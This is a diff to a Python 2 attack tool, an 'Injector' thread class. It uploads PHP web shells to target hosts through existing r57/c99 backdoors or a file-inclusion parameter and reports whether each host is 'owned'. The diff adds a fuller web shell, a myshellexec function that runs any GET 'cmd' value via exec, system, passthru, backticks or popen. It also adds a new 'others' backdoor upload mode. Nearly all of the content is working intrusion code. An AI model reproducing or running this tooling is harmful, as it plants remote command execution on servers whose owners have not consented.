@@ -2,8 +2,8 @@ import httplib, mimetypes, random, threading
 
 
 class Injector(threading.Thread):
-    global cmd
-    cmd="""<html>
+    global cmd1
+    cmd1="""<html>
    <body>
    <?php
    $md=$_GET['cmd'];
@@ -15,8 +15,45 @@ class Injector(threading.Thread):
    if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
    ?>
    </body>
-   </html>"""
-    
+   </html>
+   """
+    global cmd
+    cmd="""
+    <?php
+    function myshellexec($cmd)
+    {
+    global $disablefunc;
+    $result = ""; 
+    if (!empty($cmd))
+    {
+    if (is_callable("exec") and !in_array("exec",$disablefunc)) 
+    {exec($cmd,$result); $result = join("\n",$result);}
+  
+     elseif (($result = `$cmd`) !== FALSE) {}
+     elseif (is_callable("system") and !in_array("system",$disablefunc)) 
+     {$v = @ob_get_contents(); @ob_clean(); system($cmd); 
+      $result = @ob_get_contents(); @ob_clean(); echo $v;}
+  
+     elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) 
+     {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); 
+      $result = @ob_get_contents(); @ob_clean(); echo $v;}
+  
+     elseif (is_resource($fp = popen($cmd,"r")))
+     {
+     $result = "";
+     while(!feof($fp)) {$result .= fread($fp,1024);}
+     pclose($fp);
+     }
+    }
+    return $result;
+    }
+
+    $md=$_GET['cmd'];
+    print myshellexec($md);
+    ?>
+    """
+
+   
     def __init__(self, host, backdoor, exploit, filename, include):
         threading.Thread.__init__(self)
         self.host = host
@@ -37,6 +74,9 @@ class Injector(threading.Thread):
             data=self.encode_multipart_formdata_r57(fields, files)
         elif mode =='c99':
             data=self.encode_multipart_formdata_c99(fields, files)
+        else:
+            data=self.encode_multipart_formdata_c99(fields, files)
+        
             
         content_type, body = data
         h = httplib.HTTP(host)
@@ -120,6 +160,7 @@ class Injector(threading.Thread):
         content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
         return content_type, body
 
+
     def get_content_type(self, filename):
         return mimetypes.guess_type(filename)[0] or 'application/octet-stream'
 
@@ -135,6 +176,10 @@ class Injector(threading.Thread):
                 elif self.backdoor=="c99":
                     fields=[('act','upload'),('miniform','1'),('submit','Upload')]
                     userfile='uploadfile'
+                elif self.backdoor=="others":
+                    fields=[('miniform','1')]
+                    userfile='uploadedfile'
+               
                 selector="/"+self.exploit+'?page='+self.include
 
                 files=[(userfile,self.filename,cmd)]
@@ -143,11 +188,10 @@ class Injector(threading.Thread):
                 if self.backdoor=='r57' and data.find(self.filename) != -1:
                     return 'owned'
                 elif self.backdoor=='r57' and data.find(self.filename) == -1:
-                    return 'no owned'
+                    return 'not owned'
         except Exception, e:
             print e
 
                 
-
 
 
